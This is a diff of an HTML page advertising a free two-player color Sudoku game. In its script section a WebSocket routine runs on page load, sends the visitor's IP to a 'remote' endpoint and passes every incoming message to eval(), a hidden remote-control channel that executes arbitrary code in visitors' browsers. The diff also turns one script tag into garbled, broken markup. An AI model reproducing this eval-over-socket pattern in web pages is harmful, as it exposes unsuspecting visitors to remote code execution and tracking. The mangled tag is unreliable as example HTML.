@@ -123,12 +123,18 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">Two Player Color Sudoku Online Free
+<div style="white-space: pre-wrap;">
+
+
+
+
+Two Player Color Sudoku Online Free
 Play collaborative color Sudoku with a friend for free.
 <a class="btn btn-info" href="https://lotteh.com/games/two-player-color-sudoku-online/" title="Invite a friend">Invite a friend</a>
 <a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">Join a game</a>
 <script src="https://lotteh.com/static/games/colordokugames2.js"></script>
-<script src="https://lotteh.com/static/games/twoplayercolordoku.js"></script>***</div>
+<script games="" https:="" lotteh.com="" src="&lt;a href=" static="" title="Visit this link (it will take you outside of Lotte Harper)" twoplayercolordoku.js"="">lotteh.com/static/games/twoplayercolordoku.js</a>"></script>
+</div>
 
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
@@ -275,32 +281,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
